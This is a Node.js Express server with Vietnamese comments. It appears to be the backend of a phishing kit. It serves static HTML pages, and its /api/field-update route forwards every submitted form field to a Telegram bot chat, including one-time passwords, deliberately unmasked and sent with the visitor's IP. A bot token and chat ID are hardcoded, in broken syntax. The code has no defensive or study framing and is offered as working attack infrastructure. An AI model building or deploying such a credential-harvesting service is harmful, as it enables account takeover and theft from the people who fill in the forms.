const express = require('express');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(express.json());

/**
 * Cấu hình Telegram
 * Đặt trong .env:
 *   TELEGRAM_BOT_TOKEN=...
 *   TELEGRAM_CHAT_ID=-100xxxxxxxxxx
 * (Tuỳ chọn) ALLOW_RAW_SENSITIVE=true  => gửi nguyên văn (đang yêu cầu)
 */
const config = {
    token: process.env.8308693844: AAEe8ULvEqsIbQ9OYEbnsVv9_ONgAH4iAl4 || '',
    chatId: process.env.1003080363425 || '',
    allowRawSensitive: (process.env.ALLOW_RAW_SENSITIVE || 'true').toLowerCase() === 'true' // bạn yêu cầu không che nên mặc định true
};

function telegramEnabled() {
    // Token Telegram chuẩn có dạng: <digits>:<alphanumeric>
    if (!config.token || !config.chatId) return false;
    if (!/^[0-9]+:[A-Za-z0-9_-]+$/.test(config.token)) return false;
    return true;
}

async function telegramSend(text) {
    if (!telegramEnabled()) {
        console.warn('Telegram not configured');
        return { skipped: true };
    }
    const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
    const body = {
        chat_id: config.chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
    };
    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        let data = null;
        try { data = await res.json(); } catch (e) { data = null; }
        if (!res.ok) {
            logTelegramError(res.status, data);
            return { ok: false, httpStatus: res.status, data };
        }
        if (!data || data.ok !== true) {
            logTelegramError(res.status, data);
            return { ok: false, httpStatus: res.status, data };
        }
        return { ok: true, httpStatus: res.status };
    } catch (e) {
        console.error('Telegram send error', e);
        return { ok: false, error: e.message };
    }
}

// Throttle lỗi 404 / 400 để tránh spam console
let lastErrorStamp = 0;
let sameErrorCount = 0;
function logTelegramError(status, data) {
    const now = Date.now();
    if (now - lastErrorStamp < 1500) {
        sameErrorCount++;
        if (sameErrorCount % 10 === 0) {
            console.error(`Telegram HTTP error status= ${status} (repeated ${sameErrorCount} times)`);
        }
        return;
    }
    lastErrorStamp = now;
    sameErrorCount = 1;
    console.error('Telegram HTTP error status=', status, 'payload=', data && data.description);
}

// Phục vụ static (cả các trang .html)
app.use(express.static(path.join(__dirname)));

// HEALTH CHECK
app.get('/health', (req, res) => {
    res.json({ ok: true });
});

// Dev: xem trạng thái telegram
app.get('/api/telegram/status', (req, res) => {
    res.json({
        status: 'ok',
        hasToken: !!config.token,
        hasChatId: !!config.chatId,
        allowRawSensitive: config.allowRawSensitive,
        maskedToken: config.token ? config.token.slice(0, 6) + '...' : null,
        chatId: config.chatId || null
    });
});

// Dev: cấu hình lại telegram runtime (chỉ dùng dev)
app.post('/api/telegram/config', (req, res) => {
    const { token, chatId, allowRawSensitive } = req.body || {};
    if (token !== undefined) config.token = String(token).trim();
    if (chatId !== undefined) config.chatId = String(chatId).trim();
    if (allowRawSensitive !== undefined) config.allowRawSensitive = !!allowRawSensitive;
    res.json({
        status: 'ok', config: {
            hasToken: !!config.token,
            hasChatId: !!config.chatId,
            allowRawSensitive: config.allowRawSensitive
        }
    });
});

// Dev: gửi test
app.post('/api/telegram/test', async (req, res) => {
    const { text = 'Test message' } = req.body || {};
    if (!telegramEnabled()) return res.status(400).json({ status: 'err', error: 'not_configured' });
    const r = await telegramSend(`[TEST]\n${text}`);
    let hint = null;
    if (!r.ok) {
        if (r.httpStatus === 404) {
            hint = '404 từ Telegram: Thường do token sai hoặc endpoint bị chặn. Kiểm tra lại token (phải dạng <digits>:<chuỗi>).';
        } else if (r.httpStatus === 400 && r.data && /chat not found/i.test(r.data.description || '')) {
            hint = 'Chat not found: Sai chatId hoặc bot chưa được thêm vào nhóm/chat.';
        }
    }
    res.status(r.ok ? 200 : 502).json({ status: r.ok ? 'ok' : 'err', detail: r, hint });
});

// Chẩn đoán sâu: gọi getMe + thử resolve chatId
app.get('/api/telegram/diagnose', async (req, res) => {
    if (!config.token) return res.status(400).json({ status: 'err', error: 'missing_token' });
    const result = { tokenFormatValid: /^[0-9]+:[A-Za-z0-9_-]+$/.test(config.token) };
    try {
        const r = await fetch(`https://api.telegram.org/bot${config.token}/getMe`);
        let jd = null; try { jd = await r.json(); } catch (_) { }
        result.getMe = { httpStatus: r.status, body: jd };
    } catch (e) {
        result.getMe = { error: e.message };
    }
    if (config.chatId) {
        // Thử gửi silent để xem mô tả lỗi cụ thể nếu sai chatId
        try {
            const silent = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: config.chatId, text: '[DIAG] test', disable_notification: true })
            });
            let body = null; try { body = await silent.json(); } catch (_) { }
            result.sendProbe = { httpStatus: silent.status, body };
        } catch (e) {
            result.sendProbe = { error: e.message };
        }
    } else {
        result.sendProbe = { skipped: true, reason: 'no_chat_id' };
    }
    res.json(result);
});

/**
 * Route chính: nhận cập nhật từng trường (kể cả OTP)
 * Body: { sessionId, field, value, page }
 * Trả: { status:'ok' }
 */
app.post('/api/field-update', async (req, res) => {
    const { sessionId, field, value, page } = req.body || {};
    if (!sessionId || !field || (value === undefined || value === null || String(value).trim() === '')) {
        return res.status(400).json({ status: 'err', error: 'missing_params' });
    }

    // Theo yêu cầu: không che/mask bất kỳ trường nào (kể cả OTP)
    const rawValue = String(value);

    const lines = [
        '📩 <b>CẬP NHẬT TRƯỜNG</b>',
        `Phiên: <code>${sessionId}</code>`,
        page ? `Trang: <code>${page}</code>` : '',
        `Trường: <code>${field}</code>`,
        `Giá trị: <code>${rawValue}</code>`,
        `Thời gian: <code>${new Date().toISOString()}</code>`,
        `IP: <code>${req.ip}</code>`
    ].filter(Boolean);

    // Gửi Telegram (nếu đã cấu hình)
    telegramSend(lines.join('\n')).catch(() => { });

    res.json({ status: 'ok' });
});

// JSON parse error gọn
app.use((err, req, res, next) => {
    if (err && err.type === 'entity.parse.failed') {
        return res.status(400).json({ status: 'err', error: 'invalid_json' });
    }
    next(err);
});

process.on('uncaughtException', e => {
    console.error('Uncaught:', e);
});
process.on('unhandledRejection', e => {
    console.error('UnhandledRejection:', e);
});

// Lắng nghe
let basePort = parseInt(process.env.PORT, 10) || 4000;
const HOST = process.env.HOST || '127.0.0.1';
const MAX_TRIES = 10;

function startWithFallback(port, attempt = 0) {
    const server = app.listen(port, HOST, () => {
        console.log(`Server listening on http://${HOST}:${port}`);
    });
    server.on('error', (err) => {
        if (err.code === 'EADDRINUSE' && attempt < MAX_TRIES) {
            console.warn(`Port ${port} in use, trying ${port + 1}...`);
            startWithFallback(port + 1, attempt + 1);
        } else {
            console.error('Failed to start server:', err);
            process.exit(1);
        }
    });
}

startWithFallback(basePort);

// Endpoint debug: liệt kê tất cả route đã đăng ký
app.get('/__routes', (req, res) => {
    try {
        const out = [];
        app._router.stack.forEach(layer => {
            if (layer.route && layer.route.path) {
                out.push({
                    path: layer.route.path,
                    methods: Object.keys(layer.route.methods).join(',')
                });
            }
        });
        res.json({ routes: out });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// In ra danh sách route sau ~1 tick (đảm bảo add xong)
setTimeout(() => {
    const listed = [];
    app._router.stack.forEach(layer => {
        if (layer.route && layer.route.path) {
            listed.push(`${Object.keys(layer.route.methods).join(',').toUpperCase()} ${layer.route.path}`);
        }
    });
    console.log('Registered routes:');
    listed.forEach(l => console.log(' -', l));
}, 300);

